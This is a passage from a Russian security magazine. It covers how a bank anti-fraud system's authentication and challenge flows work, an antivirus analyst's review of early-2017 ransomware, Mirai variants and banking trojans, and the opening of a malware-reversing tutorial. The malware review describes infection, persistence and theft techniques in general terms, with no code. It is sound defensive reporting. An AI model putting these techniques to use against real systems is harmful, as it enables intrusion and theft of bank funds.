  Некоторые банки, использующие данную систему антифрода, модифи‐
цируют процесс и не отправляют платеж, пока фрод‐аналитик не разберется
с кейсом. Если он после звонка тебе отметит транзакцию как легитимную, то
деньги переведутся, а если ты ему скажешь, что деньги не переводил, то пла‐
теж заблокируется. Пока фрод‐аналитик не свяжется с тобой, перевод так
и не будет осуществлен… А еще банк может попросить тебя перезвонить.
Если ты находишься в роуминге, это не очень обрадует. А вероятность того,
что твоя первая транзакция из новой страны попадет в рассматриваемые
фрод‐аналитиком, весьма высока, и об этом мы поговорим в следующих
выпусках. В общем случае такая модификация процесса рассмот рения опе‐
рации (REVIEW) неверна, так как для подобной логики существует процесс
дополнительной аутен тификации без использования человеческого фак тора.


ДОПОЛНИТЕЛЬНАЯ АУТЕНТИФИКАЦИЯ (CHALLENGE)
Для того чтобы подтвердить подозрительный пла теж, приостановив его
выполнение, в нашей системе антифрода используется про цесс допол‐
нительной аутентификации транзакции (CHALLENGE). Система предлагает
«из коробки» интеграцию с различными способа ми дополнительной аутен‐
тификации пользователя и транзакции, например одно разо вые пароли, кон‐
трольные вопросы, биометрию на мобильных устройствах. Они могут быть
реализованы как син хронными, так и асинхронными методами. Разница меж‐
ду ними незаметна тебе как пользователю интернет‐банка, однако сущес‐
твенна при архитектурном построении системы. При использовании синхрон‐
ных методов интернет‐банк ожидает немедленного отклика от системы
антифрода, а в случае асинхронных методов ответ может поступить не сразу,
при этом интернет‐банк через определенный промежуток времени обра‐
щается к антифроду за ответом, пока не получит заключения о легитимности
пользователь ско го действия.
  Процесс исполь зования синхронных методов с точки зрения взаимо дей‐
ствия систем показан на рис. 3.





  Рис. 3. Процесс обработ ки события в случае дополнительной аутен ‐
  тификации синхронными методами

Получение данных сервером системы интернет‐банка от программного
обеспечения пользователя, передача данных в Adaptive Authentication и обра‐
ботка им информа ции — стандартно для всех процессов (1–6). Но теперь Ad‐
aptive Authentication принимает решение о необходимости дополнительной
аутентификации CHALLENGE (7). На рисунке также указаны группы данных,
которые передаются в методах вза имодействия. Ты можешь сам изучить их,
здесь мы остановимся только на специфичных данных. В этом случае
антифрод говорит, какими дополнительными методами может быть аутен‐
тифицирован пользователь или транзакция.
  После того как интернет‐банк получил от антифрода информацию о необ‐
ходимости дополнительной аутентификации, он отправляет в Adaptive Authen‐
tication запрос с методом CHALLENGE и выб ранным методом аутентифика‐
ции (8). В ответ Adaptive Authentication передает дополнительную информа‐
цию по данному методу (например, номер телефона или набор контрольных
вопросов) (9). Интернет‐банк предлагает пользователю пройти дополнитель‐
ную аутентифика цию (10), при этом отсылая пользовате ля на страницу сис‐
темы антифрода в случае, например, контрольных вопросов (11a) или самос‐
тоятельно показывая их пользователю на собственной странице (11b). Поль‐
зователь вводит аутентифицирующую его информацию (12) и передает ее
в интернет‐банк (13). Интернет‐банк вызывает метод AUTHENTICATE, содер‐
жащий информацию, переданную пользователем во время аутентификации
(14). Adaptive Authentication аутентифицирует пользователя (15) и отве чает
интернет‐банку, успешно или нет аутентифицирован пользователь  (16).
Интернет‐банк выпол няет или запрещает транзакцию пользователя в зависи‐
мости от результата аутентифика ции (18).


             INFO

                    Не нужно забывать,  что твой  Bitcoin‐кошелек
                      не защищен  подоб ной  системой  антифрода.
                      Таким  образом,  если  вирус  на  компьютере
                         от твоего имени подпишет платеж, то деньги
                          уйдут. Одним из вари антов защиты может быть
                     мно гопользовательская подпись. При этом вто‐
                       рая подпись должна уста навливаться на другом
                      компьютере, и она будет выступать в качес тве
                      дополнительной аутентификации платежа.


В случае же использования асинхрон ных методов дополнительной аутен‐
тификации процесс выглядит так, как показано на рис. 4.





  Рис. 4. Процесс обработ ки события в случае дополнительной аутен ‐
  тификации асинхронными методами

В этом случае до (9) процесс выглядит так же, как при обработке синхрон‐
ными методами. Но для аутентификации обычно используются внешние сер‐
висы или Adaptive Authentication, с которыми пользователь взаимодействует
напрямую. Интернет‐банк переводит пользователя на процесс аутентифика‐
ции (10), и внешний сервис аутентификации (который в общем случае может
быть и самим Adaptive Authentication) запрашивает у пользователя, например,
отпечаток пальца (если выбрана биометрическая аутентификация) (11–14).
После этого ответственность за аутентифика цию пользовате ля полностью
несет внешний сервис, а интернет‐банк дол жен постоянно запрашивать Ad‐
aptive Authentication о результате аутентификации пользователя при помощи
метода QUERYAUTHSTATUS (15–19). Результат может быть как положитель‐
ный или отрицательный, так и говорящий о том, что аутентификация еще не
пройдена. Далее в зависимости от результата транзакция выполняется
или нет (21).
                   ← НАЧАЛО СТАТЬИВЗЛОМ
  АНТИФРОД
         РАЗБИРАЕМ ПРОЦЕССЫ РАБОТЫ
             СИСТЕМЫ БАНКОВСКОГО
                       АНТИФРОДА





МЕТОДЫ ДОПОЛНИТЕЛЬНОЙ АУТЕНТИФИКАЦИИ
Мы  разобрали  основные  процессы  допол нительной  аутен тификации,
а теперь посмотрим, какие же методы аутентификации предлагает рассмат ‐
риваемая нами система антифрода. На некоторых из них остановимся более
подробно.


Исполь зование знаний пользовате ля
Первый метод — это аутентификация, основанная на знании (Knowledge‐
Based Authentication). Одним из вариантов такой аутен тификации могут быть
контрольные  вопросы.  Такой  метод  довольно  часто  реализует ся
на интернет‐ресурсах, но не в интернет‐банках. Обыч но процесс происходит
в синхронном режиме. Система антифрода идентифицирует пользователя,
отсылает его кон трольные вопросы в интернет‐банк для того, что бы поль‐
зователь на них ответил. Затем интернет‐банк передает ответы пользовате‐
ля, и антифрод принимает решение о воз можности аутен тификации. В нашей
системе ответ на каждый вопрос может отдельно в реальном времени обра‐
батываться антифродом с использованием скоринга.


Исполь зование в качестве фак тора аутен тификации мобильного
устрой ства
Следующий метод — это передача на телефон (Out‐of‐Band Phone Authentic‐
ation). Такая аутен тификация обыч но использует внешний сервис и выпол‐
няется в асинхронном режиме. Система антифрода отправляет одно разо вый
пароль провайдеру телефонного сервиса, а тот передает его на телефон
пользователя любым способом. После этого пользователь должен ввести его
в интернет‐бан ке, который отправляет его в систему антифро да для провер‐
ки. Проверка выпол няется либо антифродом, либо провайдером сервиса.
  Один из вариантов передачи одноразового пароля — отправка СМС (Out‐
of‐Band SMS Authentication). Этот метод также работает через внешний сер‐
вис, но чаще используется в синхронном режиме. Он часто применяется бан‐
ками, и ты можешь встретиться с ним, когда для подтвержде ния перевода
приходит одноразовый пароль в СМС. Подробно процесс аутентификации
методом Out‐of‐Band SMS Authentication изоб ражен на рис. 5.





  Рис. 5. Процесс дополнительной аутентифика ции методом отправки
 СМС

Например, ты выпол няешь перевод теперь уже на Яндекс‐кошелек (1, 2).
Интернет‐банк обращается с запросом ANALYZE к антифро ду (3), который
сообщает, что необходимо произвести дополнительную аутентификацию
транзакции (4). После этого интернет‐банк при помощи метода CHALLENGE
сообщает системе антифрода о выборе Out‐of‐Band SMS Authentication (5),
получает в ответ сообщение о необходимости запроса одноразового пароля
и выводит тебе в браузере диалоговое окно с запросом одноразового
пароля (6). Тем временем антифрод отправ ляет атрибуты транзакции и одно‐
разовый пароль оператору связи (7), который уже пересылает их в СМС
на твой телефон (8). Надеюсь, что ты читаешь всю эсэмэску и сверяешь,
соответствуют ли присланные в сообщении атрибуты платежа тем, которые
ты заполнял в браузере (9). Если они совпадают, то ты вво дишь одноразовый
пароль в диалоговое окно интернет‐бан ка (10). Интернет‐банк передает его
из твоего браузера в банк (11, 12) и запрашивает методом AUTHENTICATE
у системы антифрода, верно ли ты ввел одноразовый пароль (13). Антифрод
проверяет совпадение с привязкой к операции и пользователю и отвечает
на метод AUTHENTICATE, сообщая интернет‐банку, успешно или нет прошла
аутентификация. Если успешно, то деньги переводятся на кошелек.


             INFO

                     На самом деле использование СМС для передачи
                      одноразовых паролей нельзя считать достаточно
                    защищенным.  Содержание  сообщения  может
                      быть перехвачено еще до того, как оно дойдет
                      до  легитимного  пользователя   (см.   «Взлом
                      мобильной  свя зи  через SS7:  перехват SMS,
                      слежка  и  прочее»),  а  следовательно,  хакер
                       нивели рует  второй  фактор  аутентификации.
                      Порог  вхождения  в  реали зацию  такой  атаки
                        с каждым годом становится все ниже…



Исполь зование в качестве фак тора аутен тификации мобильного
приложе ния
Допол нитель ная аутентификация может быть также реализована с помощью
мобильного приложения и push‐нотификации (One‐Time Password Pushed
to Mobile App Authentication). В случае рассматрива емой системы это всегда
внешний сервис, при этом взаимодействие может быть как в синхронном, так
и в асинхронном режиме. Система антифрода в этом случае отсылает одно‐
разовый пароль не в СМС, а в push‐нотификации на зарегистрированное
на тебя мобильное приложение банка. Ты должен также ввести полученный
одноразовый пароль  в  интернет‐банке. Для  встраивания  возможности
получения push‐уведомлений в мобильное приложение можно восполь‐
зоваться мобиль ным SDK (набором библиотек, который пред лагает произво ‐
дитель системы антифрода, для выполнения функций аутентификации и сбо‐
ра данных для анализа риска).
  Следующим  рассмотрим  подтверждение  на  мобильном  устройстве
при помощи биометрических датчиков (Out‐of‐Band Biometrics Authentication).
Этот метод использует внешний сервис и обычно асинхронный режим.
Для проведения биометрической аутентифика ции в настоящий момент рас‐
сматриваемая нами система антифрода имеет возможность использовать
отпечаток пальца (Fingerprint) и сет чатку гла за (Eyeprint). Эта функциональ‐
ность может  быть  реализована библиотеками,  идущими  в  комплек те
с мобильным SDK системы антифрода. Вариация такого процесса приведе на
на рис. 6. Некоторые банки передают реквизиты перевода на привязанное
к тебе в системе интернет‐банка мобильное устройство при помощи push‐
нотификации. При этом на экране твоего мобиль ного устройства выводится
окно с атрибутами и запрашивается под тверждение при помощи, например,
отпечатка пальца. Результат подтверждения отправ ляется мобильным при‐
ложением в систему антифрода.





  Рис. 6. Процесс дополнительной аутентифика ции при помощи отпечатка
  пальца

Подробнее процесс выглядит следующим обра зом. Ты оплачиваешь покупку
через интернет‐банк (1, 2). Интернет‐банк запрашивает решение у системы
антифрода  методом  ANALYZE  и  получает  ответ  с  Challenge  (3,  4).
Интернет‐банк выбирает описанный нами способ аутентификации тран ‐
закции и отсылает в систему антифрода запрос CHALLENGE (5), после чего
получает ответ со статусом ожидания (6). При этом антифрод отсы лает атри‐
буты транзакции при помощи серверов push‐нотификации на твое зарегис‐
трированное мобильное приложение (7, 8), где ты проверяешь, сколько
и кому ты хочешь заплатить, и подтверждаешь пла теж отпечатком пальца (9).
Если ты подтвердил платеж, то результат этого передается в систему
антифрода при помощи облачных сервисов  (10,  11). Тем временем
интернет‐банк  периодически  опрашивает  систему  антифрода методом
QUERYAUTHSTATUS о результате аутентификации (12)  и, как только его
получает (13), пропускает или нет транзакцию в зависимости от этого резуль‐
тата.


             INFO

                      Альянс FIDO стандартизирует методики безопас‐
                      ной  аутентификации. Архи тектура FIDO пред‐
                        полагает, что биометрические шаблоны (биомет‐
                       рические  характеристики  зарегистри рованной
                       личности,  которые  сохраня ются  в  сис теме
                       для дальнейшего сравнения с биометрическим
                      образцом) хранятся на устройстве поль зователя
                      и никогда его не покида ют. При этом, нап ример,
                      производители мобильных устройств сохраняют
                        их в специально защищенных областях: Apple
                       использует  Secure  Enclave,  Android  с  вер‐
                      сии 6.0 — шифрование при помощи Trusted Exe‐
                           cution Environment (TEE) (см. «Ска нер отпечатка
                       пальца: безопасность и обход защиты»). Однако
                        сторонний софт, установленный на твой мобиль‐
                     ный телефон, как раз наоборот — чаще передает
                        твои биометрические данные на сервер для хра‐
                       нения и проведения операций сравнения. И зав‐
                        тра изображение сетчатки твоего глаза будет
                      продаваться  на  подпольных  форумах,  а  ее,
                         как пароль, не заменишь…


В рассматриваемой нами системе используется еще такой метод, как под‐
тверждение на мобильном устройстве с под писью операции (Online Transac‐
tion Signing Authentication). Он похож на предыдущий, однако после под‐
тверждения тобой платежа в мобильном приложении ответ еще и подписыва‐
ется электронной подписью для защиты от модификации. Антифрод осущест‐
вляет проверку подписи и аутентифицирует операцию.
   Также иногда предлагается использовать подтверждение на мобильном
устройстве с подписью операции через интернет‐банк (Online Transaction
Signing Authentication via Bank). Вкрат це этот процесс выглядит следующим
образом (см. рис. 7).





  Рис. 7. Процесс дополнительной аутентификации методом подписи
  транзакции при помощи отпечат ка пальца с переда чей через банк

Система  антифрода  переда ет  зашифрованные  атрибуты  опе рации
на мобильное приложение пользователя или в интернет‐банк, который сам
отсылает любым доступным способом зашифрован ные атрибуты в мобиль‐
ное приложение пользователя. При этом расшифровать атрибуты может
только мобильное приложение, а интернет‐банк такой возможности не име‐
ет. В  мобильном  приложении  пользователя  они  расшифровываются
и выводятся на экран. Пользователь подтверждает операцию, возможно —
с помощью биометрических дат чиков. Мобильное приложение подписывает
атрибуты и отправляет подпись в интернет‐банк, а не в облачные сервисы,
как в предыдущем варианте. Интернет‐банк, в свою оче редь, передает их
в систему антифрода для проверки правильности подписи и аутентификации
операции.


             INFO

                   Еще  одна  проблема  биометричес кой  аутен‐
                      тификации — это возможность подмены. Необя‐
                        зательно, что твои отпечатки пальцев продадут
                       на андеграундных форумах, их можно скопиро‐
                         вать удаленно. Например, вспомним, как Starbug
                        (Ян  Крисслер)  восста новил  отпечаток  паль ца
                     министра обороны Германии по фотографиям.
                    А системы распознавания лиц можно обмануть
                      при помощи систем виртуальной реаль ности (см.
                            «Для  обхода  биометрической  аутентификации
                      нужно VR‐устрой ство и фотографии с Facebook»),
                      при чем даже новые  датчики Samsung  Galaxy
                    S8 обхо дятся еще легче — при помощи несколь‐
                        ких фотографий  (см.  «Систему рас познавания
                      лиц Samsung Galaxy S8 обма нули при помощи
                     фото»).


В рассматриваемой нами системе антифрода заложен способ подтвержде‐
ния операции при помощи подписи с использованием мобильного приложе‐
ния в офлайн‐режиме (Oﬄine Transaction Signing Authentication). В этом случае
антифрод формирует сообщение с основными  атрибутами  транзакции
и отправляет в интернет‐банк. Интернет‐банк выводит окно пользователю
с просьбой подтвердить операцию. Поль зователь вводит отразившиеся
атрибуты в мобильное приложение, и оно формирует их электронную подпись
в виде кода. Этот код пользователь вводит в окно интернет‐банка, тем самым
подтверждая  операцию.  Код  передается  интернет‐банком  в  систему
антифрода для проведения аутентификации.


Исполь зование в качестве фак тора аутен тификации поч тового
ящика
Еще одним способом дополнительной аутентифика ции может быть отправка
почтового сообщения (Out‐of‐Band Email Authentication). Метод по сути ана‐
логичен звонку на телефон, но используется другой канал доставки одно‐
разового пароля (или ссылки) — электронная почта.
   Таковы основные воз можности системы антифрода по дополнительной
аутентификации и процессы аутентификации, предусмотренные ей.


ЗАПРЕТ ОПЕРАЦИИ (DENY)
Наконец, самый неприят ный для пользователя интернет‐банка процесс —
запрет операции. Такой ответ система антифрода может выдать, например,
если пользователь находит ся в каких‐то внутренних списках запрещенных
клиентов или превышен лимит операций. Процесс рассмотрения тран закции
с рекомен дованным действием запрета операции (DENY) мало чем отличает‐
ся от процесса с разрешением операции (ALLOW), кроме того что в резуль‐
тате операция интернет‐банком не выполняет ся (см. рис. 8).





       Рис. 8. Процесс обработ ки события в случае запрета операции


ЗАКЛЮЧЕНИЕ
Сегодня мы рассмотрели основные процессы обработки операции в системе
антифрода, а  также методы подтверждения подозрительных операций.
К сожалению, в рамках журнальной статьи нельзя описать все возможные
случаи и заковырки с внедрением методов антифрода, но общее пред став‐
ление, надеюсь, ты получил. В следующих выпусках мы перейдем к внут ‐
ренней логике антифрода, к тому, каким образом и на основании каких кри‐
териев и входящих данных рассматриваемая нами система оценивает тран‐
закцию, формируя свою резолю цию.


        WWW

                    Не забудь про честь первый материал из этого
                       цик ла: «Как защищают банки: разбираем устрой‐
                        ство и принципы бан ковского антифрода»
MALWARE





                                        Павел Шалин
                                              Аналитик, «Доктор Веб»
  ГОРЯЧАЯ
 ВЕСЕННЯЯ
 МАЛВАРЬ



      ОБЗОР САМЫХ ИНТЕРЕСНЫХ
     ВРЕДОНОСОВ ЗА ПОСЛЕДНИЕ
            ТРИ МЕСЯЦА





Продолжаем наш цикл рассказов про «малварь, которую
хочется обсудить с коллегами — вирусными аналитиками
в курилке». Сегодня в наш прицел попали сразу несколь ко
классов малвари: энкодеры, бан керы, трояны под Linux и An‐
droid. И все они, между прочим, чем‐то интересны!


Одной из самых зловредных категорий троянцев по праву считают ся шиф‐
ровальщики, или, как их еще принято называть, энкодеры. Распространяются
они чаще всего при помощи спам‐рассылок, при этом коварные злодеи вкла‐
дывают в рассылаемые письма не сам энкодер, а, как правило, крошечный
JS‐скрипт, который при выполнении загружает и запускает трояна.
  Сами сообщения могут быть отправ лены от имени какого‐либо банка, кре‐
дитного агентства, службы судеб ных приставов, администрации социальной
сети, Дедушки Мороза — в общем, некой инстанции, которая может внушить
доверие потенциальной жертве. Ну а дальше дело тех ники: скачанный
из интернета энкодер шифрует файлы пользователя и пред лагает ему зап‐
латить «доброволь ный взнос» за расшифровку. При этом размер «взноса»
может колебать ся от нескольких сотен до нескольких тысяч рублей — сумма
вознаграждения диктуется только жадностью вирусописателей. Некото рые
злодеи орга низовывают для своих «клиентов» це лые сервисные службы
в сети Tor: на специальных .onion‐сайтах пострадав шие могут для про бы рас‐
шифровать один из своих файлов, загрузив его в специальную форму,
почитать раздел вопросов‐ответов и даже пообщаться в чате со службой
«технической поддержки» киберпреступников. Вот у кого сто ило бы поучиться
клиентоориентированности некоторым производителям легального софта!
Правда, известны случаи, когда вымогатели взяли у пострадавших деньги,
а вот расшифро вать их файлы не смогли или не захотели.
  К слову, на таких подпольных сервисах порой наживаются вполне себе
легальные кон торы, предлагающие, помимо ремонта компьютеров и пере‐
установки Windows, плат ную расшифровку поврежденных энкодерами фай‐
лов — эта услуга рассчитана прежде всего на не слишком прод винутых юзе‐
ров, неспособных самостоятельно установить Tor Browser. На самом деле
никакой расшифровкой подоб ные фирмы не занима ются — они просто пишут
киберзлодеям через форму обратной связи проник новенное послание,
выторговывают  скидку,  после  чего  «заряжают»  пострадавшему  более
высокий ценник (но, как правило, ниже первоначаль ных требований вирмей‐
керов), а разницу забирают себе. Моральная сторона такого «бизнеса»
вызывает, мягко говоря, некоторые сомнения.
  А вот антивирусные компании на самом деле расшифровывают пов‐
режденные энкодерами файлы для владельцев коммерческих лицензий, при‐
чем делают это совершенно бесплат но. Разумеется, расшифровка возможна
далеко не для всех версий энкодеров, поэтому специалисты не устают снова
и снова повторять одну и ту же прописную истину: используйте, граждане,
резервное копирование, функцию защиты данных, а еще лучше — и то и дру‐
гое сразу! Тем не менее увещевания действуют далеко не на всех: с начала
года служба техподдержки «Доктор Веб» получила уже почти 7 тысяч зап-
росов от пос традав ших не только из России, но и из мно гих зарубежных
стран (а все потому, что они не читали наши статьи: эту и особенно эту,
в которой мы тестируем сомнительную эффектив ность аверов в отношении
рансомвари. — Прим. ред.). Вот самые распространенные версии энко деров
по данным за первые три месяца 2017 года, а также географическое распре‐
деление запросов от пострадавших пользователей:





             Распределение шифровальщиков по версиям





        Распределение жертв шифровальщиков (обратившихся
         за расшифровкой к нам) по странам

О чем говорят эти веселые картинки? О том, что проблема энкодеров,
во‐первых, как никогда актуальна, а во‐вторых — интернациональна. Однако
помочь, к сожалению, можно далеко не всем пострадавшим, даже несмотря
на то, что, помимо традиционного брутфорса, для борьбы с тро янцами‐шиф‐
ровальщиками используются и другие методики. Например, сливы. Не те,
из которых моя бабушка варит вкусное варенье, — я имею в виду доволь‐
но‐таки редкие случаи вык ладывания цен ной информации в паб лик. Так,
в самом  начале марта  некто  (воз можно  даже, сами вирусописатели,
у которых внезапно проснулась совесть, но это маловероятный сценарий)
разместил на форуме bleepingcomputer.com ссылку на странич ку сайта
pastebin.com, где были опубликованы приватные ключи для тро янца‐шиф‐
ровальщика Dharma (Trojan.Encoder.3953). Бла года ря это му уже 2 марта была
написана утилита расшифровки, позволяв шая восстановить файлы на компь‐
ютерах, пострадавших от этого троянца. К слову, это не первый слу чай утеч ки
ключей для Trojan.Encoder.3953. Как бы то ни было, рассчитывать на подоб‐
ное везение не стоит, поскольку сливовые урожаи созревают весьма нечас‐
то, — лучше заранее позаботиться об информационной безопасности своих
устройств.





                     Карма для вашей Дхармы


Про троянца Linux.Mirai, заражающего Linux‐девайсы с различными аппарат‐
ными архитектурами, я уже расска зывал в предыдущих заметках. Напомню
лишь, что после попадания исходников этой вредоносной программы в пуб‐
личный доступ темпы ее распростра нения ста ли расти чуть ли не в геомет‐
рической прогрессии. И вот в середине зимы вирмейкеры придумали кое‐что
новенькое. А именно: родили злодеи в ночь не то сына, не то дочь, не мышон‐
ка, не лягушку, а неведому зверюшку — троянца для Windows, пред назна-
чен ного для заражения Linux. Этот забав ный гибрид, названный нами
с необыкновенной выдумкой и фантазией —  Trojan.Mirai, работает сле‐
дующим образом. При запуске он качает со своего управля ющего сервера
конфигурационный  файл,  содержащий  список  IP‐адре сов  и  словарик
с логинами и паролями для брута. Затем  Trojan.Mirai запускает сканер,
с помощью которого опрашивает TCP‐порты по задан ному списку адресов,
и пытается залогиниться на удаленных хостах. Если ему удается соединиться
по протоколу Telnet с устройством под управлением Linux, Trojan.Mirai заг‐
ружает на него бинарный файл, который скачивает и запускает Linux.Mirai.
Если же удаленная машина, к которой трою удалось достучаться, работает
под виндой, трой действует как бэк дор: запускает в системе процессы
с использованием метода Win32_Process.Create, а при помощи RPC может
напрямую отправлять удаленному узлу команды. Если же на атакованном хос‐
те крутится сервер MS SQL, трой создает в СУБД нового юзера, присваивает
ему привилегии sysadmin и от имени этого пользователя выполняет в ском‐
прометированной системе различные задачи, задействовав для это го службу
SQL server job event.
  Вообще, интерес вирмейкеров к платформе Linux ничуть не снижается:
об этом свидетельствует хотя бы тот факт, что в янва ре специалисты «Доктор
Веб» обнаружили сразу несколько тысяч Linux‐устройств, зараженных тро‐
янцем Linux.Proxy.10. Эта вредоносная программа поднимает на атакован ном
девайсе SOCKS5‐прокси‐сервер, при этом создатели Linux.Proxy.10 решили
не заморачиваться с изоб ретением велосипеда, а использовали для своих
целей фриварные исходники утилиты Satanic Socks Server. Трой авторизу ется
на удален ном узле по протоколу SSH и при помощи утилиты sshpass выпол‐
няет на нем сценарий, запускающий прокси. Самое интересное заключается
в том, что троянец использует для авторизации весьма примечательные
логины и пароли:





          Мы все иногда добавляем подоб ные плей‐
               схол дерные имена в код, но для релиза
                это уже перебор

Пользователей с такими учетными данными обычно создают в системе дру‐
гие Linux‐троянцы. То есть Linux.Proxy.10 ломится не абы куда, а избирательно
на те узлы, которые ранее уже были заражены другой малварью. Их IP‐адреса
вместе с данными для авторизации хранят ся на управляющем сервере. О чем
это говорит? Прежде всего о том, что достаточно один раз не уследить
за своей телеприставкой или роутером, позволив злодеям сбрутить нестой‐
кий к взлому пароль, и вскоре такой девайс рискует превратиться в веселый
зоопарк, населенный множеством разношерстных Linux‐троянцев.
  Вернемся к операционным системам от кор порации Microsoft. По степени
опасности и размеру ущерба, который они способны принести, в экосистеме
Windows с энкодерами успешно конкурируют бан ков ские троянцы. Банкеры
предназначены для кражи денег непосредственно со счетов жертвы —
для этого они могут внедряться в системы «банк‐клиент» или выполнять
веб‐инжекты в страницы сервисов онлайн‐банкинга. Нового банковско го
троя, получившего название Trojan.PWS.Sphinx.2, мы иссле довали в начале
февраля.
   «Сфинкс» оказал ся пря мым наследником широко известного «Зевса»
(Zeus, Trojan.PWS.Panda) — как минимум, эти бан керы имеют общие фраг‐
менты исходного кода. Trojan.PWS.Sphinx.2 ворует деньги при помощи
веб‑инжектов: он встра ивает в просматриваемые пользователем на локаль‐
ной машине веб‐страницы постороннее содер жимое, например формы авто‐
ризации, информация из которых передается злоумышленникам. Кроме того,
в его арсенале имеется форм‑граб бер и VNC-сервер, который трой запус‐
кает на заражен ной машине, чтобы обеспечить злодеям доступ к ней.
   Очень интересно устроен механизм автозапуска «Сфинкса»: для этого
используется скрипт, написанный на язы ке PHP. На виндовой машине, Карл!
Для реализации этой хитроумной задумки вирусописателей трой дро пает
на диск два файла: php5ts.dll и php.exe — собственно интерпретатор PHP,
а затем сохраняет в одной из директорий обфусцированный PHP‐скрипт.
Для запуска этого безоб разия в папке автозагрузки создается специальный
ярлык.
  В результате выполнения скрипта стартует «Сфинкс», который выполняет
инжект в процесс explorer.exe, а затем расшифровывает тело загрузчика
и конфигурационный блок, в котором скрыты адрес управляюще го сервера
и ключ для шифрования принимаемых и отправляемых данных. Информация
передается в виде POST‐запросов, а все необ ходимые для работы данные
трой шифрует и хранит в реестре Windows, генерируя имена ветвей по спе ‐
циаль ному алгоритму.


АЛМАЗНАЯ ПЫЛЬ В СМАЗКУ ANDROID’А
В первые три месяца 2017 года досталось и пользователям ОС Android.
Для этой мобильной платформы тоже активно распространяются бан керы,
ведь программы «банк‐клиент» пользуются большой популярностью у вла‐
дельцев смартфонов. Например,  Android.BankBot.140.origin  отслеживает
запуск банковских приложений и отображает поверх их окон под дельную
форму для ввода логина и пароля. Аналогичным образом при открытии прог‐
раммы Play Маркет тро янец пытался украсть информацию о банковской кар‐
те, показывая поддельное окно настройки платежного сервиса Google Play.





        Андроидные банкеры любят прит воряться Гуглом, банками
                      и интернет‐кошельками

Важный момент заключается в том, что Android‐бан керы живут непосредс‐
твенно на мобильном устройстве, поэтому многие из них умеют перех‐
ватывать входящие СМС, скрывать их и даже незаметно отправлять ответные
сообщения по заданному в конфигурации шаб лону. Такой функцией обла‐
дает, например, Android.BankBot.149.origin. А еще он может отслеживать
GPS‐координаты зараженного устройства, красть записи из телефонной кни‐
ги и рассылать сообщения по всем доступным номерам. Кто‑то убеждал
тебя в безопас ности двухфакторной авторизации при помощи одно-
разовых СМС‑паролей? Забудь об этом.
   Ну а чаще всего поль зователи Android страдают от назойливой рек ламы,
которую показывают всевозможные рекламные троянцы и специализирован‐
ные программные модули. Одно из таких приложений, содержавших рек‐
ламный модуль Adware.Cootek.1.origin, было ска чано из каталога Google Play
50 миллионов раз. И все ска чавшие в один прекрасный момент увидели
на экранах своих девайсов примерно вот такую кар тину:





    Удивительно, но не все считают это адварью. Мало того, из Гугл Плея
                           это никто не убрал

Модуль Adware.Cootek.1.origin создает на домашнем экране Android виджеты,
которые не удаляются до тех пор, пока владелец устройства не нажмет на них.
После этого ему показы вают мини‐игру, выиграв в которой пользователь
в качестве награды вынужден просмотреть очеред ной рекламный ролик. Кро‐
ме  того, Adware.Cootek.1.origin встраивает рекламу в экран бло кировки
и показывает бан неры непосредственно после разблокиро вания мобильного
устройства. К сожалению, несмотря на то что этот модуль детек тируется
антивирусами для Android, выпилить его из системы, сох ранив при этом саму
программу‐носитель, не представляет ся возможным: он встро ен как ее
неотъ емлемая часть и предназначен для монетизации приложения. Поль‐
зователю остается непростой выбор: либо наб раться мужества и страдать,
либо не устанавливать подоб ное «бесплатное ПО» вовсе.
  А мы на этом завершаем наш сегодняшний обзор. От всей души желаю
вашим компьютерам, нетбукам, смартфонам, планшетам, телеприставкам
и прочим роботам‐пылесосам такого богатырского здо ровья, чтобы его
не сумели подорвать никакие «троянские кони».
MALWARE





                                                                            Иван Пискунов


РЕВЕРСИНГ
МАЛВАРИ
ДЛЯ НАЧИНАЮЩИХ

ЧАСТЬ 4: ВНЕДРЕНИЕ SHELLCODE И
ШИФРОВАНИЕ MALWARE‐КОДА




Рад снова тебя встретить на стра ницах нашего журнала, мой
друг! Мы продолжаем прокачивать скиллы в реверсинге
и познавать нелегкое ремесло malware‐аналитика. В сегод‐
няшнем выпус ке мы поговорим о двух интересных фичах,
которые довольно часто встречаются в «жи вых образцах»
вредоносного ПО: шифровании  (encoding) и внедрении
shellcode, позволяющего в даль нейшем получить командную
оболочку ОС потенциальной жертвы.


Ну что, ты готов попробовать свои силы и ринуться в бой? Тогда смело прис‐
тупаем к делу!


Четыре пре дыду щих уро ка
Перед прочтением этой статьи рекомендуем освежить в памяти предыдущие
материалы: нулевой, первый, второй, третий.



           WARNING

                      Вся информация предоставлена исключительно
                        в ознакомительных целях. Ни редакция, ни автор
                      не несут ответствен ности за любой возможный
                        вред, причинен ный материалами данной статьи.
                      Если ты что‐то дела ешь — будь уверен и понимай,
                         что ты делаешь!


В нашем сегодняшнем выпуске мы разберем две интересные фичи сов‐
ременного поколения malware: обфускацию кода вредоноса при помощи
шифрования и внедрение шелл‐кода (англ. shellcode) после инфициро ‐
вания — чтобы, например, выпол нить какой‐нибудь эксплоит или получить
командную оболочку ОС.


DATA ENCODING, ИЛИ ШИФРОВАНИЕ КАК ИСКУССТВО
Те оре тическая часть
Современные антивирусные движки и эв ристические анализаторы с высокой
долей вероятности позволяют обнаруживать еще неизвестные или мало изу ‐
ченные вирусы. Для того чтобы «расколоть» вредонос, антивирусное ПО сна‐
чала прогоняет по сигнатурной базе, затем, если не удается ничего обна‐
ружить, выполняет код программы в собственной пе соч нице и, наконец,
запускает поведенческий анализатор, рассмат ривая под лупой каждое дей‐
ствие вредоноса, будь то обращение к реестру, системным файлам, сторон‐
ним приложениям или проявление сетевой активности. Поэтому для скрытия
присутствия вредоноса в системе применяются различные техники и методы,
к примеру использование rootkits или bootkits, которые мы рассматривали
в прошлой статье.
  Другая задача состоит в том, чтобы максимально усложнить вирусному
аналитику ручной анализ образца малвари, когда он уже попал в антивирус‐
ную лабораторию. Это, в свою очередь, позволит оттянуть время до того,
как сигнатуру мал вари добавят в антивирусные базы или будет выпущена тул‐
за для лечения инфекции.
  Один из вариантов — шифрование собственного кода малвари (англ. en‐
coding), часто также называемое обфускацией. «Запутывать» код возможно
на уровне алгоритма, заложенного во вредонос, исходника (source code) и/
или ассемблерного текста. Для создания запутанного ассемблерного кода
(того, который мы видим в IDA Pro) могут применяться и специализированные
компиляторы, использующие неочевид ные или недоку ментированные воз‐
можности. Отдельная песня — класс специальных программ, выполняющих
обфускацию (обфускаторов). В качестве примера такого софта для программ
на платформе .NET приведу вот эту софтину, для Java — эту. Будет полезна
и старая добрая статья Криса Касперски «Об фускация и ее преодоление».
Вот тут еще одна неплохая статья с теорией. Под робный рассказ про исполь‐
зование LLVM в качестве обфускатора. И обязательно про читай статью
